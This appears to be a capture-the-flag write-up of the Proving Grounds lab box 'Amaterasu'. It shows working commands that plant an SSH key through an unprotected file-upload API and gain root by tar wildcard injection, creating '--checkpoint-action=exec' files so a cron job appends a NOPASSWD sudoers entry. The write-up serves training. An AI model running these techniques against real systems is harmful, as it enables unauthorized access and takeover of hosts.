---
title: Amaterasu
date: 2025-08-16
categories: [oscp, pg-play]
tags: [walkthrough, Linux, file-upload, API, tar-wildcard-abuse-privesc] 
image: amater.jpg
media_subpath: /assets/img/posts/2025-08-16-amaterasu/
---
# Introduction
In this guide, I discovered an HTTP service running on port 33414 and enumerated its API endpoints using Gobuster. By targeting the file-upload endpoint, I was able to upload files to the server and verified successful uploads via the dir-list endpoint. Leveraging this functionality, I uploaded an RSA public key and connected using the corresponding private key, gaining a foothold on the system.

Once inside, I identified a scheduled root cron job that processed files with wildcard expansion. I crafted a payload exploiting the wildcard handling in the backup script, allowing it to execute arbitrary commands. By placing the payload strategically, the cron job executed it, resulting in a full privilege escalation to root.

## Enumeration

### Host

**192.168.223.249**

## Nmap

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F --min-rate 1000 $IP -oN
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open --min-rate 1000 -oN 
```

## Services

### Port 21 (FTP)

I was able to login using default credentials `ftp:ftp`, but couldn’t list directory:

![image.png](image.png)

### Port 25022 (SSH)

## Web

### Port 33414

Version - Werkzeug httpd 2.2.3 (Python 3.9.13)

![image.png](image%201.png)

```bash
gobuster dir -u http://ip:33414/ -w /usr/share/wordlists/dirb/common.txt -t 42 -x pdf,txt,config
```

![image.png](image%202.png)

![image.png](image%203.png)

### Port 40080

Version -  Apache httpd 2.4.53 ((Fedora))

![image.png](image%204.png)

```bash
gobuster dir -u http://ip:40080/ -w /usr/share/wordlists/dirb/common.txt -t 42 -x pdf,txt,config -b 404,403,400
```

![image.png](image%205.png)

## Exploitation

Accessing `info` endpoint:

![image.png](image%206.png)

I can list directories too:

![image.png](image%207.png)

![image.png](image%208.png)

I will use `file-upload` feature and upload a RSA key to the server and then connect to the machine using ssh.

```bash
ssh-keygen -t rsa
```

![image.png](image%209.png)

```bash
curl -i -L -X POST -H "Content-Type: multipart/form-data" -F file="@//home/kali/PG-Practice/Amaterasu/key.pub"  http://ip:33414/file-upload
```

![image.png](image%2010.png)

<aside>
🚨

`@// means that take a local file`

</aside>

Let’s include `filename` field too:

```bash
curl -i -L -X POST -H "Content-Type: multipart/form-data" -F file="@//home/kali/PG-Practice/Amaterasu/key.pub" -F filename="/home/alfredo/.ssh/authorized_keys" http://ip:33414/file-upload
```

![image.png](image%2011.png)

I will capture the request with Burp and change the extension of `.pub` file.

```bash
curl -i -L -X POST -H "Content-Type: multipart/form-data" -F file="@//home/kali/PG-Practice/Amaterasu/key.pub" -F filename="/home/alfredo/.ssh/authorized_keys" http://ip:33414/file-upload --proxy http://127.0.0.1:8080
```

![image.png](image%2012.png)

You can compare the complexity of sending a POST request while uploading file using Burp and curl yourselves.

![image.png](image%2013.png)

Now the file is uploaded:

![image.png](image%2014.png)

Let’s see if it actually uploaded:

![image.png](image%2015.png)

```bash
chmod 600 key
ssh -i key alfredo@ip -p 25022
```

![image.png](image%2016.png)

## Privilege Escalation

I see `restapi` directory in my home folder, I am curios if this application executed in the content of the root in that case we can modify `app.py` with python reverse shell and get a shell.

But no it is executed in the context of `alfredo` user:

![image.png](image%2017.png)

Checking for a scheduled tasks I see:

```bash
cat /etc/crontab
```

![image.png](image%2018.png)

```bash
cat /usr/local/bin/backup-flask.sh
```

```bash
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

Here, I see that directory owned by our user is exported in root `PATH`, and one can think of making a malicious `cd` binary in that directory so root executes it, but the thing is there are some binaries in Linux that we cannot hijack them and they are executed as their original binaries. These are `shell builtins`:

- `cd` – change directory
- `echo` – print text
- `pwd` – print working directory
- `type` – show if a command is builtin or external
- `alias` – create command aliases
- `export` – set environment variables
- `exit` – exit the shell
- `read` – read input from user

I will abuse wildcards for `tar` command here go to `/home/alfredo/restapi` and run the following commands:

```bash
echo 'echo "alfredo ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

we put a checkpoint here, and when checkpoint is reached it will execute `root.sh` which will put our user into sudoers file with root privileges.

Wait for a cron job to be executed.

```bash
sudo -l
```

![image.png](image%2019.png)

```bash
sudo su
```

![image.png](image%2020.png)
